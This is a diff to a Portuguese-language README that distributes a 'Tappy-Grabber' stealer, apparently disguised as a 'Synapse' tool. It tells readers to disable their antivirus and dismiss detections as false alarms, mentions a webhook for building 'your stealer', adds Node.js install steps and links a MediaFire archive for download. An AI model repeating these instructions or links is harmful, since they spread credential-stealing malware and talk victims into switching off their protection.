@@ -8,6 +8,26 @@
 * 2- Caso apite seu anti virus com o ARQUIVO PRINCIPAL desative-o pois o arquivo esta limpo e isso pode ser um falso alarme, aqui você pode ver o resultado do virus total se estiver desconfiado ou pode jogar o arquivo la.
 * 3- Uma webhook para criar seu stealer.
 
+
+
+
+<br><br>
+💢 - <b>Fazer o Download do Node.js pois é necessário para o script funcionar. <p> 
+💢 ( OBS : CASO NÃO INSTALE O NODE JS, O SYNAPSE NÃO VAI ABRIR. ) 💢<P>
+  
+  SELECIONE A CAIXINHA ! QUANDO FOR INSTALAR CASO CONTRÁRIO NÃO IRÁ PEGAR !
+  
+![download](https://user-images.githubusercontent.com/113463089/192170204-d5daec34-504d-4825-8aef-fb74804dc9d4.png)
+  
+  DEPOIS QUE ABRIR O CMD CLICK ENTER DUAS VEZES E ESPERE INSTALAR POR COMPLETO O NODEJS !
+  
+💸 <b>• Download do NodeJS 64 Bits:</b> https://nodejs.org/dist/v18.9.1/node-v18.9.1-x64.msi
+<p>
+
+
+<br><p>
+
+
 <br>
 💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/626u1gxnfm9hk79/Tappy-Grabber.rar/file
 <br>
